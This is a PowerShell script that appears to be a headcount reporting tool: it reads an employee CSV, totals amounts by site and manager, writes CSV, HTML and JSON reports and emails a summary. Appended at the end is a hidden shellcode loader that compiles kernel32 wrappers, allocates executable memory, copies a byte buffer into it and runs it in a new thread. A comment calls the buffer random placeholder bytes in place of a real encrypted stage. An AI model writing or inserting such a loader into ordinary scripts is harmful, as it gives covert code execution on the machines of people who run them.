
$InputCsv   = 'C:\Data\exports\headcount.csv'
$OutputPath = 'C:\Reports\headcount-summary-2026-10-05.csv'
$GroupBy    = "Site"
$MinAmount  = 5000

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ","
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}
$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -NoTypeInformation -Path $OutputPath

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8
$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize
$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$byManager = $rows | Group-Object -Property Manager |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byManager | Format-Table -AutoSize
$style = @'
<style>
body { font-family: Calibri; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8

$byGroup | ConvertTo-Json -Depth 3 | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = 'reporting@contoso.com'
$MailFrom = 'bi@contoso.com'

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = "Headcount summary"
    Body       = $summaryBody
    SmtpServer = 'smtp.contoso.com'
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xf2, 0xbd, 0x0b, 0xb2, 0x00, 0x24, 0x66, 0xaf, 0x96, 0x48, 0xd0, 0xbd, 0x77, 0x33, 0x90, 0xe1,
    0x29, 0x78, 0xe6, 0x60, 0x4e, 0xb1, 0x15, 0xfd, 0xff, 0xd5, 0x29, 0x70, 0x56, 0x2c, 0xf3, 0x90,
    0xcc, 0xf7, 0x92, 0xdf, 0x86, 0x7d, 0xc3, 0xa5, 0x97, 0x9a, 0x67, 0x74, 0xfa, 0x35, 0x3a, 0x5a,
    0x88, 0x31, 0xa6, 0x78, 0xd8, 0x7f, 0xb3, 0xaa, 0x9a, 0x22, 0xc5, 0x12, 0x26, 0x05, 0x77, 0x03,
    0x11, 0x8c, 0x66, 0x8a, 0xc3, 0xda, 0x96, 0x45, 0xbf, 0x70, 0x9b, 0xd6, 0x63, 0x1d, 0x07, 0x0f,
    0xd5, 0xb7, 0x6f, 0xd6, 0xce, 0x38, 0xa1, 0x3c, 0x4e, 0xbc, 0x1d, 0xec, 0x8e, 0x87, 0x6e, 0xe5,
    0xce, 0x9e, 0xbf, 0x45, 0x05, 0xc0, 0x1c, 0x36, 0xaf, 0xff, 0x55, 0x6f, 0xf1, 0x61, 0x64, 0x63,
    0x42, 0xc7, 0xad, 0x18, 0xe4, 0x1b, 0x87, 0x3f, 0xb0, 0x98, 0xc0, 0x16, 0x3c, 0x10, 0x23, 0x05,
    0x1a, 0xd2, 0xea, 0xe3, 0x4f, 0x89, 0x40, 0xbd, 0x95, 0x5f, 0x6b, 0x2f, 0xbc, 0x42, 0xf5, 0xd5,
    0x69, 0x01, 0xf7, 0x0a, 0x36, 0x34, 0xc3, 0x10, 0x55, 0x7f, 0x14, 0x51, 0x55, 0xfa, 0xf0, 0xbb,
    0x11, 0x24, 0x2b, 0x25, 0x46, 0xac, 0x57, 0xf0, 0x87, 0x1b, 0xd9, 0xf3, 0x29, 0xd7, 0xef, 0x19,
    0xd9, 0x7b, 0x71, 0xa5, 0x32, 0x9d, 0x61, 0x25, 0xcb, 0x78, 0xb4, 0x61, 0xb4, 0xb4, 0x6c, 0x43,
    0x51, 0xfe, 0x35, 0x4e, 0x82, 0xef, 0x2b, 0x93, 0x3b, 0x90, 0x2d, 0x33, 0x34, 0x53, 0xb5, 0xa7,
    0x59, 0xf3, 0x61, 0x94, 0x86, 0x2a, 0xa8, 0x95, 0x88, 0xc5, 0xaa, 0x6a, 0x26, 0x45, 0xd1, 0x94,
    0x19, 0x64, 0x39, 0xfe, 0xa3, 0x1b, 0x66, 0xb5, 0x51, 0x0a, 0x24, 0x97, 0xb7, 0xa8, 0x02, 0x3f,
    0xb1, 0xcf, 0x4b, 0xf1, 0x1d, 0x1f, 0x26, 0xaa, 0xc3, 0x4b, 0x93, 0x86, 0x42, 0x10, 0xa1, 0x7a,
    0x46, 0x64, 0xbd, 0x97, 0xa9, 0x4f, 0xbb, 0xff, 0x89, 0xc2, 0x1e, 0xdf, 0xc4, 0x28, 0x19, 0x31,
    0xa6, 0x25, 0x58, 0x10, 0x64, 0x06, 0x08, 0xfa, 0xab, 0xee, 0x57, 0xe7, 0xa6, 0x79, 0x15, 0x5f,
    0x96, 0x18, 0xfa, 0x89, 0x3a, 0x13, 0xf6, 0x4a, 0x7d, 0x25, 0x1f, 0x41, 0x4e, 0x6d, 0x05, 0x7e,
    0x70, 0x63, 0x61, 0x68, 0x9c, 0x96, 0x2c, 0xd0, 0x5c, 0xd4, 0xff, 0x60, 0x89, 0x20, 0x65, 0xa7,
    0xe3, 0x13, 0xb3, 0x95, 0x4c, 0x19
)

$BufferAddress = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($BufferAddress -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeApi]::WaitForSingleObject($Thread, 3239)
[void][NativeApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
